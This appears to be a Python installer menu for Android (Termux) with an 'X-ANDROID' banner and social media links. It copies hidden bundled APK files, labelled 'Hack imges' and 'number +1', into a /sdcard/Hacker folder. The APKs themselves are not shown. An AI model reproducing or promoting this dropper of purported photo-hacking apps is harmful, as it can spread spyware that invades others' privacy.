import os.path
from os import *
import sys
import time
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
C='\033[1;36m'
X = '\033[1;33m' #اصفر
W='\033[1;37m'
A='\033[1;35m'
xan = ('''_________________________________________________________

\033[1;33m##    ##    #        ####  ##   ##  ########  ###### 
##    ##    ##     ##      ##  ##   ##         ##  ##
\033[1;35m##    ##   ###    ##       ## ##    ##         ##  ##
########   # ##  ##        ####     ########   \033[1;36m#####
##    ##  ######  ##       ## ##    ##         ##  #
##    ##  #   ###  ##      ##  ##   ##         ##  ## 
\033[1;32m##    ## ###  ####   ####  ##   ##  ########  ###  ###
 
 X-\033[1;36mA\033[1;33mN\033[1;31mD\033[1;35mR\033[1;36mO\033[1;33mI\033[1;31mD 
 \033[1;31m
\033[1;35m Telegram:>\033[1;32mhttps://t.me/X1Android
 \033[1;35mFacebook:>\033[1;32mhttps://www.facebook.com/X.11Android
________________________________________________________
 ''')
os.system("mkdir /sdcard/Hacker/")
os.system("clear")
system('sleep 3.9')
for e in xan:
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(5/400)
system('sleep 0.2')
print ( X + '  Please select the application' )
system('sleep 0.2')
print ( G + ' < '+ W + '==' + G + '[' + R + '↓↓↓Hack photos↓↓↓' + G +']')
system('sleep 0.2')
print ( G + ' < [' + R + '1' + G + ']' + W + '==' + G + '[' + C + 'Install an app Hack imges' + G +']')
system('sleep 0.2')
print ( G + ' < [' + R + '2' + G + ']' + W + '==' + G + '[' + C + 'Install an app number +1' + G +']')
system('sleep 0.2')
print ( G + ' < [' + R + '3' + G + ']' + W + '==' + G + '[' + R + 'Exit' + G +']')
system('sleep 0.2')
s = input (G+'        •~ ' +A +'Choose the number' +X +' >> ')
if s == '1':
	os.system('cp -r .Hack-imges.apk /sdcard/Hacker')
	print(G+'Go to file Hacker in storage')
elif s == '2':
	os.system('cp -r .number+1.apk /sdcard/Hacker')
	print(G+'Go to file Hacker in storage')
elif s == '3':
  os.system('clear')
  sys.exit()
else :
 	e = ('''\033[1;31m______
| ____|_ __ _ __ ___  _ __
|  _| | '__| '__/ _ \| '__|
| |___| |  | | | (_) | |
|_____|_|  |_|  \___/|_|
''')
 	print(e)
 	print (R+60*' Error ')
 	sys.exit()